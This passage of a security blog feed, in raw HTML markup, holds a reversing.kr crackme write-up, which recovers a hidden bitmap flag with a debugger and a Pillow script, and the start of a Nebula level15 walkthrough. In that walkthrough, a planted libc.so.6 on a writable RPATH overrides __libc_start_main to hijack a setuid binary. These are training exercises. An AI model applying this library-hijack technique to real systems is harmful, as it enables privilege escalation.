&lt;span class="nt"&gt;0040134A&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;C74424&lt;/span&gt; &lt;span class="nt"&gt;50&lt;/span&gt; &lt;span class="nt"&gt;000&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x50&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x0&lt;/span&gt;          &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;00401352&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;FFD7&lt;/span&gt;          &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;GetDIBits&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序首先获取绘制的对象，并提取绘制对象的像素内容。在&lt;code&gt;GetDIBits()&lt;/code&gt;的时候栈情况如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
0018FADC   4C01191B  |hDC = 4C01191B
0018FAE0   B9051E9B  |hBitmap = B9051E9B
0018FAE4   00000000  |StartLine = 0
0018FAE8   00000096  |nLines = 96 (150.)
0018FAEC   00000000  |Buffer = NULL
0018FAF0   0018FB1C  |pBitmapinfo = 0018FB1C
0018FAF4   00000000  \Usage = DIB_RGB_COLORS
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到图像为RGB图像，第一个扫描线是150（其实就是150的高度）。查看地址0018FB1C处数据的LPBITMAPINFO结构体指针的内容：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
0018FB1C  28 00 00 00 C8 00 00 00 96 00 00 00 01 00 18 00  (.È..
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;根据BITMAPINFO结构体格式，发现bitmap的长度是0xC8，高度0x96，即200x150大小。&lt;/p&gt;
&lt;p&gt;接着往下看：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;00401381&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;18&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x18&lt;/span&gt;                                &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;ResourceType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;18&lt;/span&gt;
&lt;span class="nt"&gt;00401383&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;65&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x65&lt;/span&gt;                                &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;ResourceName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;65&lt;/span&gt;
&lt;span class="nt"&gt;00401385&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x0&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hModule&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;NULL&lt;/span&gt;
&lt;span class="nt"&gt;00401387&lt;/span&gt;   &lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;7C504000&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;KERNEL32.FindResour&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;FindResourceA&lt;/span&gt;
&lt;span class="mi"&gt;0040138&lt;/span&gt;&lt;span class="nx"&gt;D&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;50&lt;/span&gt;            &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;eax&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;hResource&lt;/span&gt;
&lt;span class="mi"&gt;0040138&lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;         &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;hModule&lt;/span&gt;&lt;span class="o"&gt; =&lt;/span&gt; &lt;span class="kt"&gt;NULL&lt;/span&gt;
&lt;span class="mi"&gt;00401390&lt;/span&gt;   &lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;FF15&lt;/span&gt; &lt;span class="mi"&gt;80504000&lt;/span&gt; &lt;span class="nx"&gt;call&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;KERNEL32.LoadResour&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;LoadResource&lt;/span&gt;
&lt;span class="mi"&gt;00401396&lt;/span&gt;   &lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;50&lt;/span&gt;            &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;eax&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;hResource&lt;/span&gt;
&lt;span class="mi"&gt;00401397&lt;/span&gt;   &lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;FF15&lt;/span&gt; &lt;span class="mi"&gt;88504000&lt;/span&gt; &lt;span class="nx"&gt;call&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;KERNEL32.LockResour&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;LockResource&lt;/span&gt;
&lt;span class="nx"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后程序从自身获取资源编号为0x65、类型是0x18的资源并加载。这里提一句，&lt;code&gt;FindResource()&lt;/code&gt;返回的eax指向的数据区构造如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0047E048  60 E0 07 00 90 5F 01 00 00 00 00 00 00 00 00 00  徐....
0047E058  00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF  ........
0047E068  FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ........
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到第0-4个字节0x0007E060是资源真正的起始地址的偏移，5-8个字节0x00105F90是资源大小，0047E060才是资源数据内容的起始。这就是PE文件对于资源的布局（当然不知道也能解题）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LoadResource()&lt;/code&gt;并Lock之后，进入如下逻辑：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
0040139D   .  33FF          xor edi,edi
0040139F   .  8BCE          mov ecx,esi
004013A1   .  2BC6          sub eax,esi
004013A3   &amp;gt;  8A11          mov dl,byte ptr ds:[ecx]
004013A5   .  8A1C08        mov bl,byte ptr ds:[eax+ecx]
004013A8   .  3AD3          cmp dl,bl
004013AA      75 21         jnz XImagePrc.004013CD
004013AC   .  47            inc edi
004013AD   .  41            inc ecx
004013AE      81FF 905F0100 cmp edi,0x15F90
004013B4   .^ 7C ED         jl XImagePrc.004013A3
004013B6   .  56            push esi
004013B7   .  E8 44010000   call ImagePrc.00401500
004013BC   .  83C4 04       add esp,0x4
004013BF   .  33C0          xor eax,eax
004013C1   .  5B            pop ebx
004013C2   .  5F            pop edi
004013C3   .  5E            pop esi
004013C4   .  81C4 80000000 add esp,0x80
004013CA &amp;gt; .  C2 1000       retn 0x10
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这段逻辑很简单，一个循环，一共循环0x15F90次（刚好是上面分析的资源的大小）。之后把绘制的图像数据和资源图像数据分别放入dl和bl进行每个byte的逐一比较。一开始我以为只要比较结果正确就能拿到flag，所以直接修改比较次数为0，可惜程序正常执行，却没有flag的踪迹。所以思路转为从资源入手。&lt;/p&gt;
&lt;h1&gt;资源操作&lt;/h1&gt;
&lt;p&gt;打开exeScope之类的资源提取工具，提取编号0x65的资源，发现大小是0X15F80，比我们需要的数据小0x10个字节。于是重新跟程序到&lt;code&gt;LoadResource()&lt;/code&gt;执行后，eax为47e060，提取47e060-493ff0一共0X15F90字节所有数据到文件。发现其实最后0x10个字节直接被填充为全0。&lt;/p&gt;
&lt;p&gt;二进制文件提取出来后，需要让它作为图像显示出来。文件大小为0X15F90，十进制是90000，相当于200x150x3，也就是200x150的RGB三通道图像。我这边直接利用Python的&lt;a href="https://github.com/python-pillow/Pillow/"&gt;Pillow图像处理库&lt;/a&gt;做还原（Python3的PIL为Pillow）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;

&lt;span class="n"&gt;width&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;
&lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;150&lt;/span&gt;

&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rgb.mem&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;im&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;frombytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;im&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;transpose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FLIP_TOP_BOTTOM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;im&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;result.bmp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;提取后发现图片是上下颠倒的，不知道是由于作者故意做成颠倒的还是WinAPI中GetDIBits是倒着读的。所以使用&lt;code&gt;transpose()&lt;/code&gt;做翻转。之后可以看到作者绘制的内容为GOT三个字符，即为flag。&lt;/p&gt;</content><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level15-19 Writeup</title><link href="http://blog.yyx.me/posts/exploit-exercises-nebula-level-15-19.html" rel="alternate"></link><published>2014-09-17T16:02:00-07:00</published><updated>2014-09-17T16:02:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-09-17:/posts/exploit-exercises-nebula-level-15-19.html</id><summary type="html">&lt;p&gt;本文为漏洞利用练习网站exploit-exercises.com中Nebula类型题目第15级到19级的完整攻略。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Nebula level15&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.&lt;/p&gt;
&lt;p&gt;You may wish to review how to "compile a shared library in linux" and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.&lt;/p&gt;
&lt;p&gt;Clean up after yourself :)&lt;/p&gt;
&lt;p&gt;利用strace查看flag15，看是否能发现异常。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接strace一下flag15：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level15@nebula:/home/flag15$ strace ./flag15
...
access&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/etc/ld.so.nohwcap&amp;quot;&lt;/span&gt;, F_OK&lt;span class="o"&gt;)&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; -1 ENOENT &lt;span class="o"&gt;(&lt;/span&gt;No such file or directory&lt;span class="o"&gt;)&lt;/span&gt;
mmap2&lt;span class="o"&gt;(&lt;/span&gt;NULL, &lt;span class="m"&gt;8192&lt;/span&gt;, PROT_READ&lt;span class="p"&gt;|&lt;/span&gt;PROT_WRITE, MAP_PRIVATE&lt;span class="p"&gt;|&lt;/span&gt;MAP_ANONYMOUS, -1, &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0xb7769000
access&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/etc/ld.so.preload&amp;quot;&lt;/span&gt;, R_OK&lt;span class="o"&gt;)&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; -1 ENOENT &lt;span class="o"&gt;(&lt;/span&gt;No such file or directory&lt;span class="o"&gt;)&lt;/span&gt;
open&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;&lt;/span&gt;, O_RDONLY&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; -1 ENOENT &lt;span class="o"&gt;(&lt;/span&gt;No such file or directory&lt;span class="o"&gt;)&lt;/span&gt;
stat64&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;&lt;/span&gt;, 0xbf977ab4&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; -1 ENOENT &lt;span class="o"&gt;(&lt;/span&gt;No such file or directory&lt;span class="o"&gt;)&lt;/span&gt;
open&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;&lt;/span&gt;, O_RDONLY&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; -1 ENOENT &lt;span class="o"&gt;(&lt;/span&gt;No such file or directory&lt;span class="o"&gt;)&lt;/span&gt;
stat64&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;&lt;/span&gt;, 0xbf977ab4&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; -1 ENOENT &lt;span class="o"&gt;(&lt;/span&gt;No such file or directory&lt;span class="o"&gt;)&lt;/span&gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看见程序大量调用了libc.so.6，但是libc.so.6本身却不存在。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;readelf&lt;/code&gt;命令发现flag15对于libc.so.6存在依赖：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;因此我们需要写libc.so.6，并放到&lt;code&gt;/var/tmp/flag15&lt;/code&gt;路径下，让.so的函数直接去getflag。&lt;/p&gt;
&lt;p&gt;下面就是从哪个函数下手的问题：最方便的莫过于那些自动执行的函数，比如共享库本身加载时候需要执行的函数，Google后找到这几个：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;__attribute__&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;__attribute__&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;destructor&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="n"&gt;fini&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这是GCC特有的函数，当然也有一个相对通用的解决方案，使用内核的启动函数：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;__libc_start_main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;ubp_av&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;rtld_fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;stack_end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我这里用这个参数长的BT的启动函数来写共享库（system()实则会fork()一个新进程并exec()替换进程执行）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;__libc_start_main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;ubp_av&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;rtld_fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;stack_end&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;execl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/getflag&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gcc -fPIC -shared -o /var/tmp/flag15/libc.so.6 libc.c
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可是，执行flag15后提示:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./flag15: /var/tmp/flag15/libc.so.6: no version information available &lt;span class="o"&gt;(&lt;/span&gt;required by ./flag15&lt;span class="o"&gt;)&lt;/span&gt;
./flag15: /var/tmp/flag15/libc.so.6: no version information available &lt;span class="o"&gt;(&lt;/span&gt;required by /var/tmp/flag15/libc.so.6&lt;span class="o"&gt;)&lt;/span&gt;
